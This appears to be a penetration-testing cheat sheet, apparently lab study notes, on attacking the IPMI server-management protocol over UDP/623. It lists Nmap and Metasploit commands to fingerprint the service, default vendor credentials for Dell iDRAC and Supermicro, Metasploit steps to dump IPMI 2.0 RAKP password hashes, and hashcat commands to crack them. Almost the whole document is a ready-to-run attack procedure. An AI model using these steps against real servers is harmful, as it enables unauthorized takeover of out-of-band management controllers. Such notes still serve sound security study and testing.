# Intelligent Platform Management Interface

Uses UDP/623

1. Footprint
   ```bash
   # Nmap
   sudo nmap -sU --script ipmi-version -p 623 1.2.3.4
   
   # Metasploit
   sudo msfconsole
   use auxiliary/scanner/ipmi/ipmi_version 
   set RHOSTS 1.2.3.4
   run
   ```

2. Try default creds

   | Product         | Username      | Password                                                     |
   | --------------- | ------------- | ------------------------------------------------------------ |
   | Dell iDRAC      | root          | calvin                                                       |
   | HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
   | Supermicro IPMI | ADMIN         | ADMIN                                                        |

3. Dump hashes with Metasploit (IPMI 2.0 RAKP only)
   ```bash
   sudo msfconsole
   use auxiliary/scanner/ipmi/ipmi_dumphashes 
   set rhosts 10.129.42.195
   run
   ```

4. Crack hashes with hashcat
   ```bash
   # Try all combinations of upper case letters and numbers for an eight-character password.
   hashcat -m 7300 ipmihash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
   
   # With wordlist
   hashcat -m 7300 ipmihash.txt /usr/share/wordlists/rockyou.txt
   ```

   

